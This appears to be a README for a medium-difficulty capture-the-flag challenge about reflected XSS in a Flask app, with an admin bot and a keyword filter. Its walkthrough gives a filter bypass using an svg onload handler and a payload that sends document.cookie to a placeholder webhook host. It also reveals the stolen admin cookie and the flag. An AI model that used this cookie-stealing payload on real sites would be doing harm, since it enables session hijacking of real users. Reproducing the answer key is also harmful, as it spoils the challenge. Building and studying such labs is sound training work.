# Reflective XSS Cookie Steal CTF (Updated 2026)

**Difficulty:** Medium
**Objective:** Exploit a Reflective XSS vulnerability, bypass a simple WAF, and steal the admin's cookie to retrieve the flag.
**Flag Format:** `DAKSHH{flag}`

## Overview
This challenge has been upgraded to a Medium difficulty level. It features a basic Flask authentication mechanism backed by a local SQLite database and a reflected XSS vulnerability on the `/deshboard` endpoint.

To make it more realistic and challenging:
1.  **WAF/Filter:** The `name` parameter on `/deshboard` is filtered. Simple tags like `<script>`, `<iframe>`, `<embed>`, and `<object>` are blocked. Players will need to use event handlers (e.g., `<svg onload=...>`) to execute Javascript.
2.  **Admin Bot Simulator:** A real cookie-stealing challenge needs an admin to click the link! We've included a Puppeteer bot (`bot.js`) and a `/report` endpoint where players can submit their XSS payloads. The bot securely visits the link with the admin flag/cookie set.

## Requirements
- Python 3.x
- Node.js (for the Puppeteer Admin Bot)

## Installation & Setup

1.  **Install Python Dependencies:**
    ```bash
    pip install flask
    ```
2.  **Install Node Dependencies (for Admin Bot):**
    ```bash
    npm install puppeteer
    ```
3.  **Database:**
    The SQLite database (`users.db`) will be automatically created on the first run, seeded with the admin user (`admin@wctf.com`).

## Running the CTF Locally

1.  Start the Flask server:
    ```bash
    python app.py
    ```
    The server will run on `http://127.0.0.1:5007`.

2.  The `/report` endpoint relies on `node bot.js` being accessible. It will be called automatically by Flask when a user submits a URL.

## Exploitation Path (For the Admin / Walkthrough)

1.  Register an account or login.
2.  Navigate to `/deshboard?name=test`. Notice the reflection in the HTML: `<h1> Hello test </h1>`.
3.  Attempt `<script>alert(1)</script>`. You will hit the WAF filter: `<h1> WAF Blocked your payload... </h1>`.
4.  Bypass the WAF using an image or SVG tag, for example:
    `/deshboard?name=<svg/onload=alert(1)>`
5.  Craft a payload to steal the cookie. You will need to set up a webhook site (e.g., `webhook.site`) and use `fetch` or set `document.location="http://your-webhook/?c="+document.cookie`.
    Example payload (URL encode as needed):
    `<svg/onload=fetch("http://YOUR-WEBHOOK.site/?cookie="+btoa(document.cookie))>`
6.  Submit the URL `http://127.0.0.1:5007/deshboard?name=<svg/onload=...>` to the `/report` endpoint.
7.  The Admin bot will visit the URL, execute the Javascript, and send the Admin cookie to your webhook.
8.  Modify your browser's `_ga` cookie to match the stolen admin cookie (`YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5`).
9.  Visit `/dashboard`. The server will recognize the admin cookie and display the flag: `DAKSHH{GrEaT_yOu_ReCoVeReD_tHiS_sItE_2026}`.

## Note on Deployment
For a production CTF environment, calling `subprocess.Popen` in Flask can be dangerous and slow. It is highly recommended to isolate `bot.js` into its own microservice or task queue (like Celery/Redis) to process URLs asynchronously to prevent DoS attacks. You will also need to ensure the bot `domain` cookie setting in `bot.js` matches the deployed hostname.

---
Contributor : Jyotirmoy Karmakar(0xjyotirmoy)
